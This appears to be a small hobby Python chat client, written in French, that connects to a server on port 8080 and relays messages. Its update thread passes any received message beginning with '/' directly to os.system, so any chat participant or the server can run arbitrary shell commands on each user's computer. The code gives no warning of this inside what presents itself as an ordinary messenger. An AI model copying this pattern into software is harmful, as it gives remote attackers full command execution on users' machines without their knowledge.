import client,threading,time,os
from datetime import datetime
en_cours = True
host, ip = input("IP de l'hôte : "), 8080

socket = client.connect(host,ip)
lock_socket = threading.Lock()
if socket is None:
	raise RuntimeError("Impossible de se connecter")
pseudo = input("Pseudo : ")
lock_socket.acquire()
client.envoie(socket ,"PSEUDO:"+pseudo+'|')
lock_socket.release()

def worker(socket):
	
	global en_cours
	while en_cours:
		lock_socket.acquire()
		infos = client.envoie(socket,"UPDATE|")
		lock_socket.release()
		if infos is None:
			break
		elif infos != 'OK|':
			infos = infos[:-1].split(';')
			for mess in infos:
				if len(mess.split(" : ")) > 1 and mess.split(" : ")[1][0] == '/':
					os.system(mess.split(" : ")[1][1:])
				else:
					print(datetime.fromtimestamp(time.time()).strftime('%H:%M:%S')+" - "+mess)
					if mess == 'Extinction du serveur':
						lock_socket.acquire()
						client.envoie(socket,'STOP|')
						lock_socket.release()
						en_cours = False
		time.sleep(0.01)
	print("Thread mort")
	en_cours = False


thread_update = threading.Thread(target=worker, args=(socket,))
thread_update.start()


while en_cours:
	message = input()
	if message == "STOP" or message == 'STOPSERV':
		en_cours = False
	lock_socket.acquire()
	a = client.envoie(socket,message+'|')
	lock_socket.release()
	if a !='OK|':
		print("Ptit pb")
print("Messagerie fermée")
